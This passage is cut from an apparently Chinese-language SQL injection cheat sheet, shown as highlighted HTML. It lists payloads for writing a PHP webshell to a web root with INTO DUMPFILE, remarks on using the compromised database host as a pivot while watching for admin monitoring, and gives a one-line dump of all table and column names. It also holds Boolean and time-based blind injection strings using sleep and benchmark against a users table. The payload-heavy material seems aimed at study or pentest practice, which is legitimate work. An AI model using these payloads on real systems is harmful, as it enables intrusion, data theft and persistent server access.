class="hljs-keyword">from</span> read2_tb <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:/test2.txt&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li><p>注意test2.txt不能存在 否则报错</p></li><li><p>写自定义shell</p></li></ul><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &quot;123</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into dumpfile &#x27;/var/www/html/shell.php&#x27;;</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">union select 要把写shell语句放在最后一个 并且不能用括号包裹?id=0&#39;union+select+1,2,3,&#39;123&lt;?php+?&gt;&#39;+into+dumpfile+&#39;/var/www/html/s.php&#39;--+</code></pre><ul><li><p>利用mysql写shell的好处</p><ul><li>内网扩散 作为跳板机很理想 不过需要注意OP&#x2F;DBA岗位对这台sql主机的持续监控</li><li>提权</li></ul></li><li><p>当mysql版本为5.x时，还能使用命令直接读写文件 前提是linux</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">system <span class="hljs-built_in">cat</span> /test.txt<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">system vim <span class="hljs-regexp">/web/</span>site<span class="hljs-regexp">/www/</span>test/a.php<br></code></pre></td></tr></table></figure><ul><li><p>但此方法只能本地 远程连接mysql无法使用system</p></li><li><p>无法越权操作</p></li></ul><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h2 id="基于端口"><a href="#基于端口" class="headerlink" title="基于端口"></a>基于端口</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">oracle</span>      <span class="hljs-number">1521</span><br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">3306</span><br><span class="hljs-attribute">mssql</span>     <span class="hljs-number">1433</span><br><span class="hljs-attribute">redis</span>         <span class="hljs-number">6379</span><br><span class="hljs-attribute">eletricsearch</span> <span class="hljs-number">9200</span><br><span class="hljs-attribute">postgresql</span>    <span class="hljs-number">5432</span><br></code></pre></td></tr></table></figure><h2 id="基于系统架构搭配"><a href="#基于系统架构搭配" class="headerlink" title="基于系统架构搭配"></a>基于系统架构搭配</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">php+mysql/postgresql<br><span class="hljs-function"><span class="hljs-title">iis</span><span class="hljs-params">(asp)</span></span>+mssql/access<br><span class="hljs-function"><span class="hljs-title">iis</span><span class="hljs-params">(.net)</span></span>+mssql<br><span class="hljs-function"><span class="hljs-title">java</span><span class="hljs-params">(jsp)</span></span>+oracle/mysql<br></code></pre></td></tr></table></figure><h2 id="基于报错信息"><a href="#基于报错信息" class="headerlink" title="基于报错信息"></a>基于报错信息</h2><ul><li>mssql</li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image_2-5832854.png" alt="img"></p><ul><li>oracle</li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image_3-1735730563726-2-5832854.png" alt="img"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">ORA-<span class="hljs-number">01756</span>:quoted<span class="hljs-built_in"> string</span><span class="hljs-built_in"> not</span> properly terminated  <br>ORA-<span class="hljs-number">00</span>933:SQLcommand<span class="hljs-built_in"> not</span> properly ended  <br></code></pre></td></tr></table></figure><ul><li>mssql</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Msg</span> <span class="hljs-number">170</span>,level <span class="hljs-number">15</span>, State <span class="hljs-number">1</span>,Line <span class="hljs-number">1</span>  <br><span class="hljs-attribute">Line</span> <span class="hljs-number">1</span>:Incorrect syntax near ‘foo  <br><span class="hljs-attribute">Msg</span> <span class="hljs-number">105</span>,level <span class="hljs-number">15</span>,state <span class="hljs-number">1</span>,Line <span class="hljs-number">1</span>  <br><span class="hljs-attribute">Unclose</span> quotation mark before the character string ‘foo  <br></code></pre></td></tr></table></figure><ul><li>mysql</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x<br></code></pre></td></tr></table></figure><h2 id="基于工具判断"><a href="#基于工具判断" class="headerlink" title="基于工具判断"></a>基于工具判断</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sqlmap -f <span class="hljs-comment">#指纹判别数据库类型</span><br>sqlmap -<span class="hljs-keyword">b </span><span class="hljs-comment">#获取数据库版本信息</span><br></code></pre></td></tr></table></figure><h2 id="基于注释符号"><a href="#基于注释符号" class="headerlink" title="基于注释符号"></a>基于注释符号</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#         mysql</span><br><span class="hljs-number">520.</span>e(<span class="hljs-number">9</span>)    mysql<br><span class="hljs-literal">null</span> %<span class="hljs-number">00</span> access<br><span class="hljs-comment">--   oracle 或者 mssql</span><br>;    oracle 不支持可能报错<br></code></pre></td></tr></table></figure><h2 id="基于函数"><a href="#基于函数" class="headerlink" title="基于函数"></a>基于函数</h2><ul><li>len<ul><li>mssql&#x2F;mysql</li></ul></li><li>length<ul><li>oracle</li></ul></li><li>@@version&#x2F;version()<ul><li>mysql二者都可</li><li>mssql只能前者</li></ul></li><li>substring  substr<ul><li>oracle  substr</li><li>mssql  substring</li></ul></li></ul><h1 id="mysql手工注入总结"><a href="#mysql手工注入总结" class="headerlink" title="mysql手工注入总结"></a>mysql手工注入总结</h1><p>常用payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">一句话dump所有表名、列名<br><span class="hljs-keyword">select</span> concat(@:=<span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span>`information_schema`.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-keyword">and</span>@:=concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,<span class="hljs-built_in">table_name</span>,<span class="hljs-number">0x3a3a</span>,<span class="hljs-built_in">column_name</span>)),@);<br></code></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><table><thead><tr><th align="center">函数</th><th align="left">用法</th></tr></thead><tbody><tr><td align="center">left(a,b)</td><td align="left">从左侧截取a的前b位 示例：left((select @@version),10)</td></tr><tr><td align="center">substr(a,b,c)</td><td align="left">从b位置开始，截取字符串a的c长度</td></tr><tr><td align="center">mid(a,b,c)</td><td align="left">同substr</td></tr><tr><td align="center">ascii()</td><td align="left">将某个字符转换为ascii值 示例：select ascii(‘a’) ascii(substr((select database()),1,2))</td></tr><tr><td align="center">ord()</td><td align="left">同ascii</td></tr><tr><td align="center">exp(x)</td><td align="left">此函数返回e(自然对数的底)到X次方的值 注意：x&#x3D;709是不会报错的临界值</td></tr><tr><td align="center">if(expr1,epxr2,expr3)</td><td align="left">语句一为真，则返回语句二，否则返回语句三 示例：’and if(1&gt;2,1,0) and ‘a’&#x3D;’a</td></tr><tr><td align="center">case when then end</td><td align="left">case when 1&#x3D;2 then 1 else 0 end 类似if</td></tr><tr><td align="center">ifnull(exp1,exp2)</td><td align="left">如果exp1不为null ，则返回exp1 ，否则返回exp2</td></tr><tr><td align="center">nullif(exp1,exp2)</td><td align="left">如果exp1&#x3D;&#x3D;exp2，则返回null，否则返回exp1</td></tr><tr><td align="center">like</td><td align="left">‘_’匹配单个任意字符 ‘%’匹配万物</td></tr><tr><td align="center">rlike</td><td align="left">只能用正则表达式进行匹配 示例：user()rlike’[a-zA-Z0-9]’</td></tr><tr><td align="center">regexp</td><td align="left">同rlike</td></tr><tr><td align="center">注user</td><td align="left">user()、current_user()、system_user()、session_user()</td></tr></tbody></table><ul><li>截取函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Left</span><span class="hljs-params">(version()</span></span>,<span class="hljs-number">1</span>)    <br><span class="hljs-function"><span class="hljs-title">reverse</span><span class="hljs-params">(right(reverse(version()</span></span>),<span class="hljs-number">1</span>)<br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">(user()</span></span>)         返回目标长度<br><span class="hljs-function"><span class="hljs-title">len</span><span class="hljs-params">(user)</span></span>              同length<br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(str,pos,len)</span></span>    从pos开始的位置截取str字符串中len长度的字符<br><span class="hljs-function"><span class="hljs-title">substring</span><span class="hljs-params">()</span></span>            同substr<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span></span>                  同substr<br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(str,length)</span></span>      返回字符串str最右边的length个字符<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">(str)</span></span>             返回字符串最左边字符的ASCII码值         <br><span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(str)</span></span>               同ascii<br><span class="hljs-function"><span class="hljs-title">lpad</span><span class="hljs-params">(str1,len,str2)</span></span>    如果str1大于len，返回str1左边的len个字符，否则在str1左边填充str2至len<br><span class="hljs-function"><span class="hljs-title">rpad</span><span class="hljs-params">(str1,len,str2)</span></span>    跟lpad同理，不过是在右边填充<br>instr (root,<span class="hljs-attribute">r</span>)         返回字符串root中第一次出现r的位置,从<span class="hljs-number">1</span>开始<br><span class="hljs-function"><span class="hljs-title">position</span><span class="hljs-params">(<span class="hljs-string">&#x27;r&#x27;</span> in <span class="hljs-string">&#x27;root&#x27;</span>)</span></span>返回<span class="hljs-attribute">r</span>在root中首次出现的位置<br><span class="hljs-function"><span class="hljs-title">ltrim</span><span class="hljs-params">()</span></span>和<span class="hljs-built_in">rtrim</span>()       去除字符串左侧或右侧的空格或其他指定字符。<br><span class="hljs-function"><span class="hljs-title">insert</span><span class="hljs-params">(str,len,x,new)</span></span>  用于在指定位置插入一个子字符串，并可选择替换原有的部分字符<br>strcmp (str1,str2)     所有的字符串均相同，返回<span class="hljs-number">0</span>，若根据当前分类次序，第一个参数小于第二个，则返回-<span class="hljs-number">1</span>，其它情况返回<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>其它函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Char</span><span class="hljs-params">(<span class="hljs-number">49</span>)</span></span>    <br><span class="hljs-function"><span class="hljs-title">Hex</span><span class="hljs-params">(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span>    <br><span class="hljs-function"><span class="hljs-title">Unhex</span><span class="hljs-params">(<span class="hljs-number">61</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">concat</span><span class="hljs-params">(str1,str2)</span></span>        函数用于连续两个或多个字符串(也可以是列)，形成一个字符串<br><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(str1,str2)</span></span>  连接str1，str2，如果有多行结果用逗号分割<br><span class="hljs-function"><span class="hljs-title">conv</span><span class="hljs-params">(str,m,n)</span></span>   将str从m进制转换为n进制<br><span class="hljs-function"><span class="hljs-title">hex</span><span class="hljs-params">()</span></span>           十六进制编码<br><span class="hljs-function"><span class="hljs-title">lower</span><span class="hljs-params">()</span></span>         转成小写字母<br><span class="hljs-function"><span class="hljs-title">upper</span><span class="hljs-params">()</span></span>         转成大写字母<br><span class="hljs-function"><span class="hljs-title">char</span><span class="hljs-params">(num)</span></span>       将ASCII码转换为字符串<br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">(<span class="hljs-number">710</span>)</span></span>        计算以e为底的<span class="hljs-number">710</span>次方，临界值<span class="hljs-number">709</span><br><span class="hljs-function"><span class="hljs-title">cot</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>          表示角度为<span class="hljs-number">1</span>弧度的角的余切值，<span class="hljs-built_in">cot</span>(<span class="hljs-number">0</span>)无意义会报错<br><span class="hljs-function"><span class="hljs-title">power</span><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">99999</span>)</span></span>  计算<span class="hljs-number">2</span>的<span class="hljs-number">99999</span>次方<br><span class="hljs-function"><span class="hljs-title">UpdateXml</span><span class="hljs-params">()</span></span>     用来改变文档中符合我们条件的值<br><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span>  从目标XML中返回符合我们条件的字符串<br><span class="hljs-function"><span class="hljs-title">greatest</span><span class="hljs-params">(n1,n2)</span></span> 返回最大的值<br><span class="hljs-function"><span class="hljs-title">least</span><span class="hljs-params">(n1,n2,n3)</span></span> 返回最小的值<br></code></pre></td></tr></table></figure><h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><ul><li>特殊符号</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>&quot;&quot;    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = &quot;admin&quot;;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> &quot;users&quot;;  <span class="hljs-comment">-- 需要启用 ANSI_QUOTES 模式</span><br>()    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#123;&#125;    占位符？<br>\     转义<br>\\    转义反斜杠 <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;C:\\Program Files\\MySQL&#x27;</span>; 这将输出 C:\Program Files\MySQL<br>``    <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> `users` <span class="hljs-keyword">where</span> id =<span class="hljs-number">1</span>; 包住列名、表名、允许使用一些特别的字符作为表名、列名的名称<br>%   通配符<br></code></pre></td></tr></table></figure><ul><li>注释符号</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">#     注意get请求的时候，#要url编码为%<span class="hljs-number">23</span> 因为在url中#会被默认当为锚点<br><span class="hljs-comment">/**/</span>   <span class="hljs-comment">/*/**/</span>这样是等效于<span class="hljs-comment">/**/</span><br>-- + 用这个符号注意是--空格任意字符很多人搞混了<br>;%<span class="hljs-number">00</span><br>`<br><span class="hljs-comment">/*!*/</span>  <span class="hljs-comment">/*!/*!*/</span>是等效于<span class="hljs-comment">/*!*/</span>的<br>一般直接寻找闭合即可忽略注释<br></code></pre></td></tr></table></figure><ul><li>操作符号</li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">:</span>=<br>||, <span class="hljs-built_in">OR</span>, <span class="hljs-built_in">XOR</span><br>&amp;&amp;, <span class="hljs-built_in">AND</span><br><span class="hljs-built_in">NOT</span><br>BETWEEN, CASE, WHEN, THEN, ELSE<br>=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN<br>|<br>&amp;<br>&lt;&lt;, &gt;&gt;<br>-, +<br>*, /, DIV, %, <span class="hljs-built_in">MOD</span><br>^<br>- (一元减号), ~ (一元比特反转)<br>!<br>BINARY, COLLATE<br></code></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="使用ascii"><a href="#使用ascii" class="headerlink" title="使用ascii"></a>使用ascii</h4><ul><li><p>ascii()会根据ascii码表将字符转换为数字 比如s会转换为115</p></li><li><p>在盲注的时候我们可以根据延时或者布尔类型来得到我们想要的数据</p></li><li><p>and ascii(substring((select database()),1,1))&#x3D;115–+</p></li><li><p>substr(a,b,c)从b位置开始，截取字符串a的c长度</p></li><li><p>当数据库名第一个字符为s的时候 and之后的值为true 所以能返回正常查询的结果 否则不返回结果</p></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921194550934-5832854.png" alt="image-20240921194550934"></p><ul><li><p>使用left</p><ul><li>left(database(),1)&#x3D;’s’</li><li>效果与上面相同 left()表示从左开始截断参数所给值位数的字符</li><li>比如database()的值是security 那么left(security,1)的值就是s</li></ul></li><li><p>使用limit限制返回的条数</p></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921195635720-1735730398231-3-5832854.png" alt="image-20240921195635720"></p><ul><li><p>有的时候遇到提示无法显示超过1行的值 我们可以用substring 也可以用limit 来进行操作<br><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921195718976-1735730399941-5-5832854.png" alt="image-20240921195718976"></p></li><li><p>表示从0开始到1结束 也就是第一行的值<br><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921200134523-1735730401504-7-5832854.png" alt="image-20240921200134523"></p></li><li><p>和substring搭配 截断出第一个字符 需要注意的是</p></li><li><p><code>substring</code> 不能直接对一组结果（例如多个表名）进行操作。它只能作用于单个字符串。如果你的子查询返回的是多个结果（如多个表名），那就会产生语法错误，因为 <code>substring</code> 期望一个字符串，而不是一组值。因此需要搭配limit使用</p></li><li><p>ord()</p><ul><li>SELECT ORD(‘A’);  – 返回 65 返回ascii值</li></ul></li><li><p>mid()</p><ul><li>SELECT MID(‘Hello, World!’, 1, 5);  – 返回 ‘Hello’</li><li>从第一个字符开始 截取长度为5的子字符串</li></ul></li><li><p>组合使用查字段值</p></li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27; AND ORD(MID((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">IFNULL</span>(<span class="hljs-keyword">CAST</span>(username <span class="hljs-keyword">AS</span> CHAR), <span class="hljs-number">0x20</span>) <span class="hljs-keyword">FROM</span> security.users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) &gt; <span class="hljs-number">1</span> --+<br></code></pre></td></tr></table></figure><ul><li><p>使用IFNULL()处理空值 如果username为NULL 则返回一个空格字符 0x20是空格的十六进制表示</p></li><li><p>CAST(username AS CHAR)是将username 强制转换成字符串类型 防止后续出错</p></li><li><p>ORDER BY ID 表示按照id排序</p></li><li><p>LIMUT 0,1 确保返回一个记录</p></li><li><p>MID(…,1,1)确保返回一个字符</p></li><li><p>ORD()转换为ascii码值</p></li></ul><h4 id="使用正则表达式"><a href="#使用正则表达式" class="headerlink" title="使用正则表达式"></a>使用正则表达式</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27; and 1=(<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA=<span class="hljs-string">&quot;security&quot;</span> <span class="hljs-keyword">AND</span> table_name REGEXP <span class="hljs-string">&#x27;^[a-e]&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) --+<br></code></pre></td></tr></table></figure><ul><li><p>AND table_name REGEXP ‘^[a-e]’</p><ul><li>表示只选择以字母a到e开头的表名</li></ul></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">基于<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>()</span><br>基于<span class="hljs-variable">benchmark</span><br>基于<span class="hljs-variable">REGEXP</span>、<span class="hljs-variable">RLIKE</span><br>基于笛卡尔积<br>基于<span class="hljs-variable">get_lock</span><br>本文仅展示前两种方法<br></code></pre></td></tr></table></figure><ul><li>sleep() ,如果sleep()跟在 where 、order by 后面使用 延时的时间等于数据条数乘以正常时间</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(database())&gt;<span class="hljs-number">7</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>if条件为真执行sleep 否则不执行</li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921201855136-1735730405503-9-5832854.png" alt="image-20240921201855136"></p><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240921202005841-1735730408363-11-5832854.png" alt="image-20240921202005841"></p><ul><li>如果sleep被过滤 还可以使用benchmark()</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>if((mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=%<span class="hljs-number">27</span>s%<span class="hljs-number">27</span>),benchmark(<span class="hljs-number">10000000</span>,md5(<span class="hljs-number">123</span>)),<span class="hljs-number">1</span>) %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><ul><li><p>benchmark(cout，expr)用于测试函数的性能 参数一是次数 二是要执行的表达式 可以让函数执行若干次表达式 所以能看到明显延时</p></li><li><p>假设闭合方式是单个单引号</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;and user() like &#x27;</span>_%<span class="hljs-string">&#x27; or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>b 正常返回内容<br>?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;and user() like &#x27;</span>_<span class="hljs-string">&#x27; or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>b 不正常返回内容<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-attribute">1</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;b 正常返回内容</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;b 不正常返回内容</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=2,1,sleep(4)) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;b sleep4秒</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(<span class="hljs-attribute">115</span>=ascii(substr(user(),1,1)),1,sleep(4)) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;b 只有相等才不会延时</span><br></code></pre></td></tr></table></figure><ul><li>不使用if的思路</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;and sleep(5*(1)) or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>b 延时<br><span class="hljs-attr">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;and sleep(5*(0)) or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>b 不延时<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27;and sleep(<span class="hljs-number">5</span>*(ascii(substr(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>)) or &#x27;a&#x27;=&#x27;b 只有相等才会延时<br></code></pre></td></tr></table></figure>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">case</span> when <span class="hljs-number">1</span>=<span class="hljs-number">1</span> then <span class="hljs-number">1</span> else <span class="hljs-number">2</span> end #如果<span class="hljs-number">1</span>=<span class="hljs-number">1</span>则返回<span class="hljs-number">1</span>,否则返回<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">114</span> = (ascii(substr(user(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))) <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span> = <span class="hljs-symbol">&#x27;b</span> <br></code></pre></td></tr></table></figure><figure class="highlight 